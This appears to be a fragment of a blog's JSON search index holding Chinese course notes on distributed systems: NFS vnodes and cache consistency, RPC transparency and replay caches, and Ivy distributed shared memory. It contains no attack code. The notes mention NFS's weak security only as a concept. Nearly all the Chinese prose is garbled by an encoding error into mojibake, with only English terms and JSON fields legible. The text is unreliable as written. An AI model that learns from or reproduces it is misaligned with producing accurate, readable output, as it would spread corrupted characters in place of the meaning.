é€‰æ‹©ä¸è¿™ä¹ˆåšï¼Œå°±æ˜¯ä¸ºäº†ç¡®ä¿ç³»ç»Ÿçš„å†…éƒ¨å®ç°è¶³å¤Ÿç®€å•ï¼ŒåŒæ—¶ä¿æŒäº†æ— çŠ¶æ€çš„ç‰¹æ€§ã€‚è¿™ç§ä¸ºäº†å®ç°ç®€å•è€Œæœ‰æ„ç‰ºç‰²ä¸€å°éƒ¨åˆ†æ­£ç¡®æ€§ã€ä¸€è‡´æ€§å’Œå®Œå¤‡æ€§çš„åšæ³•æ­£æ˜¯ Worse is Better çš„è®¾è®¡æ€æƒ³ã€‚ ","date":"2021-10-18","objectID":"/distributed-systems/:3:3","tags":["Linux","åˆ†å¸ƒå¼"],"title":"æ˜Ÿç½—æ£‹å¸ƒï¼šã€Šåˆ†å¸ƒå¼ç³»ç»Ÿä¸å®‰å…¨ã€‹è¯¾ç¨‹ç¬”è®°","uri":"/distributed-systems/"},{"categories":["æ¢ç´¢"],"content":"æ‰©å±• Unix æ–‡ä»¶ç³»ç»Ÿ ä¸ºäº†æ›´æ— ç¼åœ°é€‚é…åˆ° Unix æ–‡ä»¶ç³»ç»Ÿï¼ŒNFS å¼•å…¥äº† vnode çš„æ¦‚å¿µï¼Œè¿™å®é™…ä¸Šæ˜¯å¯¹ inode çš„ä¸€å±‚æŠ½è±¡ï¼Œä½¿å¾— vnode æ—¢å¯æ ‡è¯†æœ¬åœ°æ–‡ä»¶ï¼Œåˆå¯æ ‡è¯†è¿œç¨‹æ–‡ä»¶ã€‚åŒæ—¶ï¼Œvnode è¿˜å¯ä»¥æ ‡è¯†åŒä¸€å°æœºå™¨ä¸Šå‡ ç§ä¸åŒæ–‡ä»¶ç³»ç»Ÿä¸­çš„æ–‡ä»¶ã€‚ vnode æä¾›çš„æ¥å£ä½¿å¾—å¼€å‘è€…æ— éœ€å…³å¿ƒæ“ä½œçš„æ–‡ä»¶æ¥è‡ªå“ªé‡Œï¼Œè®¸å¤šç°æœ‰ç¨‹åºä»£ç ä¹Ÿæ›´å®¹æ˜“è¿ç§»ã€‚ ä¾‹å¦‚ï¼Œå½“åº”ç”¨ç¨‹åºè°ƒç”¨ open ç³»ç»Ÿè°ƒç”¨æ—¶ï¼Œä¼šé€šè¿‡ File syscall layer-\u003eVnode layer-\u003eClient-\u003eServer-\u003eVnode layer-\u003eFile system çš„è·¯å¾„ä¸€æ­¥æ­¥ LOOKUP å¹¶æœ€ç»ˆæ‰“å¼€æ–‡ä»¶ã€‚ Client ä¹Ÿä¼šå¯¹æœ€è¿‘ä½¿ç”¨çš„ vnode è¿›è¡Œç¼“å­˜ä»¥å‡å°‘ RPC è¯·æ±‚ã€‚ç„¶è€Œï¼Œå¤šä¸ª Client ç¼“å­˜äº†åŒä¸€ä¸ªæ–‡ä»¶æ—¶ï¼Œå°±ä¼šç¼“å­˜ä¸€è‡´æ€§çš„é—®é¢˜ã€‚ ","date":"2021-10-18","objectID":"/distributed-systems/:3:4","tags":["Linux","åˆ†å¸ƒå¼"],"title":"æ˜Ÿç½—æ£‹å¸ƒï¼šã€Šåˆ†å¸ƒå¼ç³»ç»Ÿä¸å®‰å…¨ã€‹è¯¾ç¨‹ç¬”è®°","uri":"/distributed-systems/"},{"categories":["æ¢ç´¢"],"content":"ç¼“å­˜ä¸€è‡´æ€§ å¦‚æœä¸€ä¸ªåº”ç”¨å†™äº†æœ¬åœ°æ–‡ä»¶ï¼Œæ–‡ä»¶çš„æ”¹åŠ¨é€šå¸¸ä¼šå†™å…¥ç¼“å­˜è€Œä¸æ˜¯ç«‹åˆ»å†™å…¥ Serverã€‚åœ¨è¿™æ®µæ—¶é—´é‡Œï¼Œå¦ä¸€ä¸ª Client è¯»å–åˆ°çš„æ–‡ä»¶å°±æ˜¯å°šæœªæ›´æ–°çš„æ–‡ä»¶ï¼Œå¼•èµ·ç¼“å­˜ä¸€è‡´æ€§é—®é¢˜ã€‚ NFS æä¾›äº†ä¸¤ç§ä¿è¯ç¼“å­˜ä¸€è‡´æ€§çš„æ–¹æ³•ï¼š close-to-open consistency å¦‚æœå…ˆ CLOSE å OPENï¼Œå°±èƒ½ä¿è¯ READ è¯»åˆ°çš„æ•°æ®ä¸€å®šæ˜¯ WRITE æ“ä½œä¹‹åçš„ å¦‚æœåœ¨ CLOSE å‰ OPENï¼Œåˆ™æ— æ³•ä¿è¯è¿™ä¸€ç‚¹ï¼Œè¿™ä¹Ÿæ˜¯ç¼“å­˜ä¸€è‡´æ€§å’Œæ•°æ®ä¸€è‡´æ€§çš„åŒºåˆ«æ‰€åœ¨ read-write consistencyï¼šå¦‚æœ OPEN äº†åŒä¸€æ–‡ä»¶ï¼Œåˆ™ READ è¯»åˆ°çš„æ•°æ®ä¸€å®šæ˜¯ WRITE æ“ä½œä¹‹åçš„ï¼Œæ˜¾ç„¶è¿™æ ·æ›´èƒ½ä¿è¯ä¸€è‡´æ€§ä½†å¼€é”€æ›´å¤§ close-to-open consistency çš„å…·ä½“åŸç†ï¼Œæ˜¯æ¯æ¬¡åº”ç”¨ OPEN æ–‡ä»¶æ—¶ï¼Œéƒ½ä¼šæ£€æŸ¥æœ¬åœ°ç¼“å­˜ä¸­æ–‡ä»¶çš„ä¿®æ”¹æ—¶é—´å’Œ GETATTR RPC è¯·æ±‚æ‰€è·å¾—çš„ vnode ä¿®æ”¹æ—¶é—´ï¼Œå¦‚æœä¸ä¸€è‡´ï¼Œåˆ™åˆ é™¤ç¼“å­˜é‡æ–°è·å–æ–‡ä»¶ã€‚è€Œ WRITE åˆ™åªä¼šå†™åˆ°æœ¬åœ°ç¼“å­˜ï¼Œç›´åˆ° CLOSE åæ”¹åŠ¨æ‰ä¼šå†™åˆ° Server ä¸­ã€‚ ","date":"2021-10-18","objectID":"/distributed-systems/:3:5","tags":["Linux","åˆ†å¸ƒå¼"],"title":"æ˜Ÿç½—æ£‹å¸ƒï¼šã€Šåˆ†å¸ƒå¼ç³»ç»Ÿä¸å®‰å…¨ã€‹è¯¾ç¨‹ç¬”è®°","uri":"/distributed-systems/"},{"categories":["æ¢ç´¢"],"content":"å±€é™æ€§ å®‰å…¨æ€§ï¼šNFS å¹¶æ²¡æœ‰æŠŠå®‰å…¨æ€§æ”¾åœ¨ä¸€ä¸ªé‡è¦çš„åœ°ä½ï¼Œæœªæˆæƒè®¿é—®ã€ä¸­é—´äººæ”»å‡»éƒ½æ˜¯å¯è¡Œçš„ å¯ä¼¸ç¼©æ€§ï¼šNFS Server æ‰¿å—çš„æµé‡å‹åŠ›è¾ƒå¤§ï¼Œæ— æ³•æ”¯æŒè¿‡å¤š NFS Client å› ä¸ºæ€§èƒ½ã€ä¸¢åŒ…å¤„ç†ç­‰åŸå› ï¼Œéš¾ä»¥åœ¨å¤§è§„æ¨¡å¤æ‚ç½‘ç»œä¸­ä½¿ç”¨ ä¸ºä»€ä¹ˆ NFS å®‰å…¨æªæ–½æå¼±ï¼Œä½†å´æ²¡æœ‰å—åˆ°ä¸¥é‡çš„æ”»å‡»ï¼Ÿä¸»è¦åŸå› å¯èƒ½æ˜¯ file handle éš¾ä»¥çŒœè§£ã€‚ ","date":"2021-10-18","objectID":"/distributed-systems/:3:6","tags":["Linux","åˆ†å¸ƒå¼"],"title":"æ˜Ÿç½—æ£‹å¸ƒï¼šã€Šåˆ†å¸ƒå¼ç³»ç»Ÿä¸å®‰å…¨ã€‹è¯¾ç¨‹ç¬”è®°","uri":"/distributed-systems/"},{"categories":["æ¢ç´¢"],"content":"RPC é€æ˜æ€§ ","date":"2021-10-18","objectID":"/distributed-systems/:4:0","tags":["Linux","åˆ†å¸ƒå¼"],"title":"æ˜Ÿç½—æ£‹å¸ƒï¼šã€Šåˆ†å¸ƒå¼ç³»ç»Ÿä¸å®‰å…¨ã€‹è¯¾ç¨‹ç¬”è®°","uri":"/distributed-systems/"},{"categories":["æ¢ç´¢"],"content":"è®¾è®¡ç›®æ ‡ ç¼–å†™åˆ†å¸ƒå¼ç³»ç»Ÿä»£ç æ—¶ï¼Œå°½å¯èƒ½å‡å°‘å¯¹å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯çš„ä»£ç å’Œè¡Œä¸ºä¸Šçš„æ”¹åŠ¨ï¼Œå¹¶ä½¿å¾—å¼€å‘è€…æ— éœ€å…³å¿ƒç½‘ç»œå¸¦æ¥çš„é—®é¢˜ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼ŒRPC å¸Œæœ›èƒ½è®©åˆ†å¸ƒå¼ç¼–ç¨‹å†™èµ·æ¥å°±åƒåœ¨å•ç‚¹ç³»ç»Ÿä¸­ä¸€æ ·ï¼Œæä¾›â€œé€æ˜æ€§â€ã€‚ ","date":"2021-10-18","objectID":"/distributed-systems/:4:1","tags":["Linux","åˆ†å¸ƒå¼"],"title":"æ˜Ÿç½—æ£‹å¸ƒï¼šã€Šåˆ†å¸ƒå¼ç³»ç»Ÿä¸å®‰å…¨ã€‹è¯¾ç¨‹ç¬”è®°","uri":"/distributed-systems/"},{"categories":["æ¢ç´¢"],"content":"æŠ½è±¡ é¦–å…ˆé¢ä¸´çš„é—®é¢˜å°±æ˜¯ï¼Œåœ¨ä¸åŒæœºå™¨ä¸Šå¯¹æ•°æ®çš„è¡¨ç¤ºä¸åŒï¼Œä¾‹å¦‚ 32 ä½ / 64 ä½ã€å°ç«¯æ³• / å¤§ç«¯æ³•ç­‰ç­‰ã€‚å› æ­¤ï¼Œåœ¨æ•°æ®ä¼ é€’æ—¶ï¼Œå¿…é¡»ä½¿ç”¨ä¸€ç§å’Œæœºå™¨æ— å…³çš„æ•°æ®è¡¨ç¤ºæ–¹å¼ï¼Œå³ Interface Description Languageã€‚ IDL æ‰€åšçš„äº‹ä¸å¤–ä¹ä¸¤ä»¶ï¼š å°†ä¸åŒç¼–ç¨‹è¯­è¨€åŸç”Ÿçš„æ•°æ®ç±»å‹ï¼Œåºåˆ—åŒ–ä¸ºæœºå™¨æ— å…³çš„å­—èŠ‚æµä»¥åœ¨ç½‘ç»œä¸Šä¼ é€’ï¼ˆåä¹‹åŒç†ï¼‰ åœ¨å®¢æˆ·ç«¯ä¸Šä½¿ç”¨ stub å°†è¯·æ±‚å‘é€è‡³æœåŠ¡ç«¯ ä¾‹å¦‚ï¼Œå¯¹äº Sun RPC æ¥è¯´ï¼ŒIDL å°±æ˜¯ XDRï¼Œä¹Ÿæ˜¯åœ¨ CW1 ä¸­ä½¿ç”¨çš„ IDLã€‚é¦–å…ˆåœ¨ proto.x ä¸­ç¼–å†™ API å®šä¹‰ï¼Œéšå rpcgen proto.x è‡ªåŠ¨ç”Ÿæˆä»£ç ã€‚ ","date":"2021-10-18","objectID":"/distributed-systems/:4:2","tags":["Linux","åˆ†å¸ƒå¼"],"title":"æ˜Ÿç½—æ£‹å¸ƒï¼šã€Šåˆ†å¸ƒå¼ç³»ç»Ÿä¸å®‰å…¨ã€‹è¯¾ç¨‹ç¬”è®°","uri":"/distributed-systems/"},{"categories":["æ¢ç´¢"],"content":"ğŸŒ° NFS åœ¨ NFS ä¸­ï¼ŒClient æœ¬è´¨ä¸Šå°±æ˜¯é’ˆå¯¹æ–‡ä»¶ syscall çš„ä¸€ä¸ª RPC stubã€‚æ­¤æ—¶ï¼Œsyscall çš„å‚æ•°ã€è¿”å›å€¼éƒ½æ²¡æœ‰å—åˆ°å½±å“ï¼Œæä¾›äº†ä¸€å®šç¨‹åº¦çš„é€æ˜æ€§ã€‚ ç„¶è€Œï¼Œè¿™ç§é€æ˜æ€§ä»…ä»…æ˜¯å½¢å¼ä¸Šçš„ã€‚å¦‚æœåªæœ‰å½¢å¼ä¸Šçš„é€æ˜æ€§è€Œæ²¡æœ‰è¯­ä¹‰ä¸Šçš„é€æ˜æ€§ï¼Œç°æœ‰çš„ä»£ç å°½ç®¡èƒ½å¤Ÿè¿è¡Œï¼Œå´ä¼šäº§ç”Ÿé”™è¯¯çš„ç»“æœã€‚æ‰€è°“è¯­ä¹‰é€æ˜æ€§ï¼Œå³åŒæ ·çš„è°ƒç”¨æ˜¯å¦åœ¨ NFS å’Œ Unix æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿä¸Šè¡¨ç°ä¸€è‡´ã€‚æ˜¾ç„¶ï¼ŒNFS æ²¡èƒ½æä¾›è¿™ç§è¯­ä¹‰é€æ˜æ€§ï¼š åœ¨ Unix ä¸Šï¼Œåªæœ‰æ–‡ä»¶ä¸å­˜åœ¨æ—¶ open() æ‰ä¼šå¤±è´¥ï¼›åœ¨ NFS ä¸Šï¼Œå¦‚æœæœåŠ¡å™¨å®•æœºï¼Œopen() ä¹Ÿä¼šå¤±è´¥ï¼Œç”šè‡³å¯èƒ½ä¸€ç›´æŒ‚èµ· åœ¨ Unix ä¸Šï¼Œclose() ä¸å¯èƒ½å¤±è´¥ï¼›åœ¨ NFS ä¸Šï¼Œè°ƒç”¨ close() æ—¶ä¼šè§¦å‘æ‰¹é‡å†™æ“ä½œï¼ˆä¹Ÿå°±æ˜¯å«æœ‰éšæ€§çš„ write() ï¼‰ï¼Œåœ¨ Server ç©ºé—´ä¸è¶³æ—¶å¯èƒ½å¤±è´¥ åœ¨ NFS ä¸Šï¼Œå‡å¦‚ Client å‘é€é‡å‘½åè¯·æ±‚ï¼ŒServer å®Œæˆäº†é‡å‘½åä½†æœªèƒ½å‘é€å“åº”å°±å®•æœºäº†ï¼Œé‚£ä¹ˆåœ¨ Server æ¢å¤å Client çš„é‡ä¼ ä¼šå¾—åˆ°â€œæ–‡ä»¶ä¸å­˜åœ¨â€çš„å“åº”ï¼Œè¿™åœ¨ Unix ä¸Šä¸å¯èƒ½å‘ç”Ÿ åœ¨ Unix ä¸Šï¼Œå¦‚æœ A æ‰“å¼€æ–‡ä»¶åè¯¥æ–‡ä»¶è¢« B åˆ é™¤ï¼ŒA ä¾ç„¶èƒ½ç»§ç»­è¯»æ–‡ä»¶ï¼›åœ¨ NFS ä¸Šï¼ŒA åˆ™æ— æ³•å†è¯»è¯¥æ–‡ä»¶ ç¬¬ä¸€ä¸ªé—®é¢˜å¹¶ä¸æ˜¯ NFS ç‰¹æœ‰çš„ï¼Œè€Œæ˜¯åˆ†å¸ƒå¼ç³»ç»Ÿå‡é¢ä¸´çš„é—®é¢˜ï¼›è€Œåä¸‰ä¸ªé—®é¢˜è™½ç„¶å¯ä»¥ä¿®å¤ä»¥æå‡è¯­ä¹‰é€æ˜æ€§ï¼Œä½†éƒ½éœ€è¦ä»˜å‡ºæ€§èƒ½çš„ä»£ä»·ã€‚åŒç†ï¼Œæå‡æ€§èƒ½ä¹Ÿå¸¸å¸¸éœ€è¦ç‰ºç‰²ä¸€éƒ¨åˆ†ä¸€è‡´æ€§ï¼Œä¾‹å¦‚ä¸Šæ–‡æåŠçš„ close-to-open consistencyï¼Œå¹¶ä¸æ˜¯ä»€ä¹ˆæ—¶å€™éƒ½èƒ½æä¾›è¶³å¤Ÿå¼ºçš„ä¸€è‡´æ€§ã€‚ ","date":"2021-10-18","objectID":"/distributed-systems/:4:3","tags":["Linux","åˆ†å¸ƒå¼"],"title":"æ˜Ÿç½—æ£‹å¸ƒï¼šã€Šåˆ†å¸ƒå¼ç³»ç»Ÿä¸å®‰å…¨ã€‹è¯¾ç¨‹ç¬”è®°","uri":"/distributed-systems/"},{"categories":["æ¢ç´¢"],"content":"å¼‚å¸¸å¤„ç† RPC éœ€è¦å¤„ç†ç±»ä¼¼æœåŠ¡ç«¯å®•æœºã€ç½‘ç»œä¸¢åŒ…ç­‰å•ç‚¹ç³»ç»Ÿä¸­ä¸å­˜åœ¨çš„å¼‚å¸¸ï¼Œå¹¶é‡‡ç”¨ At-most-once çš„æ‰§è¡Œç­–ç•¥ã€‚è¿™æ˜¯å› ä¸ºï¼Œå¦‚æœå“åº”ä¸¢åŒ…äº†ï¼Œå®¢æˆ·ç«¯ä¼šé‡ä¼ å·²ç»æ‰§è¡Œè¿‡çš„è¯·æ±‚ï¼Œæ­¤æ—¶å¦‚æœæ“ä½œå…·æœ‰å¹‚ç­‰æ€§åˆ™ä¸ä¼šå‡ºé—®é¢˜ï¼Œä½†å¦‚æœæ˜¯ç±»ä¼¼äºå……å€¼ / æ”¶è´¹ç­‰è¯·æ±‚ï¼Œå†æ¬¡æ‰§è¡Œæ˜¾ç„¶ä¼šå¸¦æ¥å¤§éº»çƒ¦ã€‚å› æ­¤ï¼ŒæœåŠ¡ç«¯å¯ä»¥ç»´æŠ¤ replay cacheï¼Œä½¿å¾—æ”¶åˆ°é‡å¤è¯·æ±‚æ—¶ç›´æ¥è¿”å› cache ä¸­çš„å€¼ï¼Œè€Œä¸æ˜¯å†æ‰§è¡Œä¸€æ¬¡ã€‚ ","date":"2021-10-18","objectID":"/distributed-systems/:4:4","tags":["Linux","åˆ†å¸ƒå¼"],"title":"æ˜Ÿç½—æ£‹å¸ƒï¼šã€Šåˆ†å¸ƒå¼ç³»ç»Ÿä¸å®‰å…¨ã€‹è¯¾ç¨‹ç¬”è®°","uri":"/distributed-systems/"},{"categories":["æ¢ç´¢"],"content":"Ivy RPC å¯¹äºæå‡é€æ˜æ€§çš„å°è¯•åŸºæœ¬å¤±è´¥äº†ï¼Œå®ƒæ˜¾å¼çš„é€šä¿¡æ–¹å¼éœ€è¦å¼€å‘è€…å°å¿ƒåœ°å®šä¹‰èŠ‚ç‚¹é—´çš„é€šä¿¡æ¥å£ï¼Œæ²¡èƒ½æå‡å¤ªå¤šé€æ˜æ€§ã€‚æˆ‘ä»¬è½¬è€Œæ€è€ƒï¼Œèƒ½ä¸èƒ½ä½¿ç”¨ä¸€ç§éšå¼çš„é€šä¿¡æ–¹å¼æ¥è¾¾åˆ°è¿™ä¸€ç›®çš„å‘¢ï¼Ÿåˆ†å¸ƒå¼å…±äº«å†…å­˜æä¾›äº†è¿™æ ·ä¸€ç§å¯èƒ½æ€§ã€‚ Ivy åˆ›å»ºäº†ä¸€ç§æ‰€æœ‰èŠ‚ç‚¹å…±äº«åŒä¸€å—å†…å­˜çš„å¹»è±¡ï¼Œéšè—äº†åœ¨è®¿é—®å…¶ä»–èŠ‚ç‚¹å†…å­˜æ—¶åº•å±‚çš„ç½‘ç»œä¼ è¾“ï¼Œä»è€Œå®ç°éšå¼çš„é€šä¿¡ã€‚å½“ç„¶ï¼Œæ—¢ç„¶ç”¨åˆ°ç½‘ç»œï¼Œå°±è¦é¢ä¸´ç½‘ç»œå¸¦æ¥çš„æ€§èƒ½ã€æ­£ç¡®æ€§ã€ä¸€è‡´æ€§ç­‰é—®é¢˜â€¦â€¦ å› ä¸º Ivy è®©åˆ†å¸ƒå¼ç³»ç»Ÿçš„èŠ‚ç‚¹â€œå…±äº«â€åŒä¸€å†…å­˜ï¼Œæˆ‘ä»¬ä¸å¦¨å°†å„èŠ‚ç‚¹å…·è±¡ä¸º CPUã€‚é¦–å…ˆéœ€è¦è§£å†³çš„é—®é¢˜å°±æ˜¯æ€ä¹ˆæŠŠç¨‹åºçš„ä¸åŒéƒ¨åˆ†äº¤ç»™ä¸åŒ CPU å»æ‰§è¡Œï¼Œå¹¶ç¡®ä¿æ­£ç¡®æ€§ã€‚ ç°ä»£ CPU å¹¶ä¸ä¼šæŒ‰æŒ‡ä»¤é¡ºåºæ¥é€æ¡æ‰§è¡ŒæŒ‡ä»¤ã€‚æ‰€è°“æ­£ç¡®æ€§ï¼Œå³æ‰§è¡Œç»“æœçœ‹èµ·æ¥å°±åƒæ˜¯æŒ‡ä»¤é€æ¡æ‰§è¡Œåäº§ç”Ÿçš„ç»“æœä¸€æ ·ã€‚ å¦‚æœæˆ‘ä»¬è®©æ¯ä¸ª CPU éƒ½æŒæœ‰ä¸€ä»½å…¨éƒ¨å…±äº«å†…å­˜çš„å¤åˆ¶ï¼Œé‚£ä¹ˆè¯»å†…å­˜ä¼šéå¸¸å¿«ã€‚ç„¶è€Œï¼Œå†™å†…å­˜åˆ™éœ€è¦å°†å†™æ“ä½œå¼•å…¥çš„æ”¹å˜ä¼ æ’­åˆ°å…¶ä»– CPUï¼Œè€Œç½‘ç»œå»¶è¿Ÿåœ¨è¿™é‡Œæ˜¯ä¸å¯å¿½è§†çš„ã€‚æœ¬åœ°è¯»å’Œå¼‚åœ°å†™çš„æ—¶é—´å·®ï¼Œä»¥åŠèŠ‚ç‚¹é—´ç½‘ç»œå»¶è¿Ÿçš„å·®å¼‚ï¼Œéƒ½ä¼šä½¿å¾—å˜é‡å€¼çš„å˜åŒ–åœ¨æ—¶é—´ä¸Šä¸ä¸€è‡´ï¼Œä»è€Œç ´åæ­£ç¡®æ€§ã€‚å› æ­¤ï¼Œè¿™ç§æ–¹æ¡ˆä¸å¯è¡Œï¼Œæ¯ä¸ª CPU å¿…é¡»æŒæœ‰å…±äº«å†…å­˜çš„ä¸€éƒ¨åˆ†è€Œä¸æ˜¯å…¨éƒ¨ã€‚ è¿™å°±å¼•å‡ºäº†å¦‚ä½•åˆ’åˆ†å†…å­˜ç»™ CPU çš„é—®é¢˜ã€‚å®¹æ˜“æƒ³åˆ°ï¼Œå›ºå®šçš„åˆ’åˆ†æ–¹æ³•æ— æ³•é¡¾åŠå±€éƒ¨æ€§ï¼ŒåŠ¿å¿…ä¼šæ•ˆç‡ä½ä¸‹ã€‚è€ŒåŠ¨æ€çš„åˆ’åˆ†æ–¹æ³•â€”â€”æ¯”å¦‚ CPU å¯¹æŸä¸ªé¡µè¿›è¡Œè¯»å†™æ—¶å°†å…¶ç§»åŠ¨åˆ° CPU ä¸Šâ€”â€”ä¸èƒ½å¤„ç†å¤šä¸ª CPU è¯»åŒä¸€ä¸ªé¡µçš„æƒ…å†µã€‚ å› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥è€ƒè™‘ä»…ä»…åœ¨å†™æ—¶ç§»åŠ¨é¡µã€‚è€Œå½“ CPU éœ€è¦è¯»å¼‚åœ°å†…å­˜æ—¶ï¼Œåªéœ€è¦æ‰¾åˆ°æœ€åå†™è¯¥é¡µçš„ CPU å¹¶å¤åˆ¶ä¸€ä»½åªè¯»çš„æ‹·è´ã€‚ ","date":"2021-10-18","objectID":"/distributed-systems/:5:0","tags":["Linux","åˆ†å¸ƒå¼"],"title":"æ˜Ÿç½—æ£‹å¸ƒï¼šã€Šåˆ†å¸ƒå¼ç³»ç»Ÿä¸å®‰å…¨ã€‹è¯¾ç¨‹ç¬”è®°","uri":"/distributed-systems/"},{"categories":["æ¢ç´¢"],"content":"æœºåˆ¶ç®€ä»‹ - ä¸­å¿ƒåŒ– Manager Ivy å°±é‡‡ç”¨äº†ç±»ä¼¼çš„æ€æƒ³ï¼Œç”¨ä¸­å¿ƒåŒ–çš„ Manager ç®¡ç†é¡µçš„åˆ†é…ï¼Œä¸‹é¢ç”¨ä¾‹å­é˜é‡Šå…¶ä¸­çš„æœºåˆ¶ã€‚å‡è®¾å­˜åœ¨ä¸‰ä¸ª CPUï¼Œå…¶ä¸­ç¬¬ä¸‰ä¸ª CPU åŒæ—¶è¿˜æ˜¯ Managerã€‚æ¯ä¸ª CPU ç»´æŠ¤è‡ªå·±çš„ page tableï¼ŒManager åˆ™é¢å¤–ç»´æŠ¤ä¸€ä¸ª info tableã€‚ ptable lock access owner CPU0 CPU1 CPU2 info lock copy_set owner Manager lock åˆ—ç”¨æ¥é”å®šè¡¨çš„ç¼–è¾‘æƒé™ï¼Œaccess å¯ä»¥ä¸º R / W / nil è¡¨ç¤º CPU å¯¹è¯¥é¡µæœ‰è¯» / è¯»å†™ / æ— æƒé™ï¼Œowner åˆ™æ ‡å¿—å½“å‰ CPU æ˜¯å¦ä¸ºæœ€åå†™è¯¥é¡µçš„ CPUã€‚æœ€åï¼Œinfo è¡¨ä¸­ copy_set ç»´æŠ¤äº†è¯¥é¡µçš„æ‰€æœ‰åªè¯»æ‹·è´ï¼Œowner ä¿å­˜äº†æœ€åå†™è¯¥é¡µçš„ CPU åç§°ã€‚ æ³¨æ„è¿™é‡Œæ¯ä¸ª CPU çš„ ptable å’Œ Manager çš„ info table éƒ½è¢«ç®€åŒ–åˆ°äº†ä¸€è¡Œï¼Œå³å¯¹åº”æŸä¸€ç‰¹å®šçš„é¡µã€‚ CPU1 è¯» CPU0 çš„é¡µ å‡è®¾åˆå§‹çŠ¶æ€å¦‚ä¸‹ï¼Œé¡µä¸º CPU0 æ‰€æ‹¥æœ‰ï¼š ptable lock access owner CPU0 â W âœ… CPU1 â nil â CPU2 â nil â info lock copy_set owner Manager â {} CPU0 ç°åœ¨ï¼ŒCPU1 æƒ³è¦è¯»å–è¯¥é¡µã€‚äºæ˜¯å®ƒé¦–å…ˆ lock äº†è‡ªå·± ptable ä¸­å¯¹åº”çš„è¡Œï¼Œå‘ Manager å‘é€ read queryã€‚Manager æ¥æ”¶åï¼Œlock è‡ªå·± info ä¸­å¯¹åº”çš„è¡Œï¼Œå°† CPU1 åŠ å…¥ copy_setã€‚ ptable lock access owner CPU0 â W âœ… CPU1 âœ… nil â CPU2 â nil â info lock copy_set owner Manager âœ… {CPU1} CPU0 éšåï¼ŒManager å‘ Owner ä¹Ÿå°±æ˜¯ CPU0 å‘é€ read forwardã€‚CPU0 æ¥æ”¶åï¼Œlock ptableï¼Œå°† access æ”¹ä¸º Rã€‚ ptable lock access owner CPU0 âœ… R âœ… CPU1 âœ… nil â CPU2 â nil â info lock copy_set owner Manager âœ… {CPU1} CPU0 éšåï¼ŒCPU0 å‘ CPU1 å‘é€ read data å unlock ptableã€‚CPU1 æ¥æ”¶åï¼Œå‘ Manager å‘é€ read confirmï¼Œå¹¶å°† access æ”¹ä¸º Rï¼Œæœ€å unlock ptableã€‚Manager æ”¶åˆ°åï¼Œä¹Ÿ unlock infoã€‚ ptable lock access owner CPU0 â R âœ… CPU1 â R â CPU2 â nil â info lock copy_set owner Manager â {CPU1} CPU0 CPU2 å†™ CPU0 çš„é¡µ ä¹¦æ¥ä¸Šå›ï¼Œæ­¤æ—¶ CPU2 æƒ³å†™ CPU0 çš„é¡µï¼Œé‚£ä¹ˆå®ƒä¼š lock ptableï¼Œå‘ Manager å‘é€ write queryã€‚Manager æ¥æ”¶åï¼Œlock infoï¼Œå¹¶å‘ copy_set ä¸­çš„ CPU1 å‘é€ invalidateï¼Œä»¥æ’¤é”€ CPU1 çš„è¯»æƒé™ã€‚CPU1 æ¥æ”¶åï¼Œlock ptable å¹¶å°† access æ”¹ä¸º nilã€‚ ptable lock access owner CPU0 â R âœ… CPU1 âœ… nil â CPU2 âœ… nil â info lock copy_set owner Manager âœ… {CPU1} CPU0 éšåï¼ŒCPU1 å‘ Manager å‘é€ invalidate confirm å¹¶ unlock ptableã€‚Manager æ¥æ”¶åï¼Œä» copy_set ä¸­ç§»é™¤ CPU1ï¼Œå‘ Owner å³ CPU0 å‘é€ write forwardã€‚ ptable lock access owner CPU0 â R âœ… CPU1 â nil â CPU2 âœ… nil â info lock copy_set owner Manager âœ… {} CPU0 CPU0 æ¥æ”¶åï¼Œlock ptableï¼Œå°† access è®¾ä¸º nil å¹¶æ”¾å¼ƒ Owner èº«ä»½ï¼Œæœ€åå‘ CPU2 å‘é€ write dataã€‚ ptable lock access owner CPU0 âœ… nil â CPU1 â nil â CPU2 âœ… nil â info lock copy_set owner Manager âœ… {} CPU0 éšåï¼ŒCPU0 unlock ptableã€‚CPU2 æ¥æ”¶åï¼Œå°† access è®¾ä¸º W å¹¶æˆä¸ºæ–°çš„ Ownerï¼Œæœ€åå‘ Manager å‘é€ write confirm å¹¶ unlock ptableã€‚ ptable lock access owner CPU0 â nil â CPU1 â nil â CPU2 â W âœ… info lock copy_set owner Manager âœ… {} CPU0 Manager æ¥æ”¶åï¼Œå°† owner è®¾ä¸º CPU2ï¼Œæœ€å unlock infoã€‚ ptable lock access owner CPU0 â nil â CPU1 â nil â CPU2 â W âœ… info lock copy_set owner Manager â {} CPU2 å¯ä»¥æ³¨æ„åˆ°ï¼Œptable çš„é”çš„å­˜åœ¨æœ¬è´¨ä¸Šé˜²æ­¢äº†å¹¶å‘å†™çš„å‘ç”Ÿï¼Œä½¿å¾—å†™æ“ä½œå¿…é¡»æ˜¯åŸå­çš„ã€‚ æˆ‘ä»¬ä¹Ÿå¯ä»¥å°† copy_set ç§»åŠ¨è‡³æ¯ä¸ª CPU ä¸Šè€Œä¸æ˜¯æ”¾åœ¨ Manager ä¸Šï¼Œä½¿å¾— confirm ç±»çš„æ¶ˆæ¯ä¸éœ€è¦å†è¢«å‘é€ã€‚æ­¤å¤–ï¼Œè¿˜å¯ä»¥ä½¿ç”¨åˆ†å¸ƒå¼ Manager è¿›ä¸€æ­¥æå‡æ€§èƒ½ã€‚ ","date":"2021-10-18","objectID":"/distributed-systems/:5:1","tags":["Linux","åˆ†å¸ƒå¼"],"title":"æ˜Ÿç½—æ£‹å¸ƒï¼šã€Šåˆ†å¸ƒå¼ç³»ç»Ÿä¸å®‰å…¨ã€‹è¯¾ç¨‹ç¬”è®°","uri":"/distributed-systems/"},{"categories":["æ¢ç´¢"],"content":"ä¸ RPC å¯¹æ¯” ç›¸æ¯” RPCï¼Œåˆ†å¸ƒå¼å…±äº«å†…å­˜çš„ä¼˜ç‚¹åœ¨äºï¼š æä¾›äº†æ›´å¼ºçš„é€æ˜æ€§ ä½¿å¾—åˆ†å¸ƒå¼ç³»ç»Ÿç¼–ç¨‹æ›´ä¸ºå®¹æ˜“ ç„¶è€Œï¼ŒRPC åŒæ ·å…·å¤‡åˆ†å¸ƒå¼å…±äº«å†…å­˜æ¬ ç¼ºçš„ä¼˜ç‚¹ï¼š æ›´å¥½çš„éš”ç¦»æ€§ å¯¹é€šä¿¡æ›´å¯æ§ 